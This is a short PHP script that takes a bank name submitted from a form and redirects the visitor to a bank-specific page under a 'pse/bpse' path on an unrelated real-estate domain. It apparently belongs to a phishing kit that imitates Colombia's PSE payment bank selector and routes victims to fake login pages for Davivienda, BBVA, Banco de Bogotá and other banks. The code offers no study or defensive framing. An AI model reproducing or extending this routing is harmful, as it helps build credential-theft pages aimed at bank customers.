<?php
$banco = $_POST['banco'];

switch ($banco) {
    case 'BANCO POPULAR':
        header("Location: https://deyaar-realestate.com/pse/bpse/popular");
        break;
        case 'DAVIPLATA':
        header("Location: https://deyaar-realestate.com/pse/bpse/daviplataa");
        break;
        case 'BANCO DAVIVIENDA':
        header("Location: https://deyaar-realestate.com/pse/bpse/daviviendaz");
        break;
        case 'BANCO DE OCCIDENTE':
        header("Location: https://deyaar-realestate.com/pse/bpse/occidente");
        break;
    case 'SCOTIABANK COLPATRIA':
        header("Location: https://deyaar-realestate.com/pse/bpse/colpatria");
        break;
    case 'BANCO BBVA COLOMBIA S.A.':
        header("Location: https://deyaar-realestate.com/pse/bpse/bbva");
        break;
    case 'BANCO AV VILLA':
        header("Location: https://deyaar-realestate.com/pse/bpse/avvilla");
        break;
    case 'BANCO CAJA SOCIAL':
            header("Location: https://deyaar-realestate.com/pse/bpse/cajasocial");
            break;
    case 'BANCO ITAU':
                header("Location: ");
            break;
            case 'BANCO DE BOGOTA':
                header("Location: https://deyaar-realestate.com/pse/bpse/bogota");
            break;
    default:
        header("Location: ../index.html");
}

exit();
?>
